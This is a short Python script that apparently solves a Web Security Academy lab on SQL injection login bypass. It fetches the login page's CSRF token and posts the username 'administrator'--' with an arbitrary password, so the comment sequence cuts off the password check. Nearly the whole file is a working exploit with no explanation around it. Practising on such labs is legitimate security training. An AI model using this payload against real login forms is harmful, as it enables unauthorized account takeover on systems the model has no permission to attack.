#!/usr/bin/env python3
"""SQL injection vulnerability allowing login bypass"""

import os

import bs4
import requests

# pylint: disable=too-few-public-methods
class Lab:
    """Wrapper"""

    def __init__(self) -> None:
        lab_id = os.environ["LAB_ID"]
        self.url = f"https://{lab_id}.web-security-academy.net"
        self.session = requests.Session()

    def csrf_token(self, path: str) -> str:
        """Get CSRF token"""
        response = self.session.get(self.url + path)
        response.raise_for_status()
        soup = bs4.BeautifulSoup(response.text, features="lxml")
        meta_token = soup.find("input",
                               attrs={"name": "csrf", "type": "hidden"})
        csrf_token = meta_token["value"]
        if csrf_token is None:
            raise ValueError("No CSRF token")
        return csrf_token

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf_token = site.csrf_token("/login")
    payload = {"csrf": csrf_token,
               "username": "administrator'--",
               "password": "yolo"}
    response = site.session.post(site.url + "/login", data=payload)
    print(response.status_code)

if __name__ == "__main__":
    main()
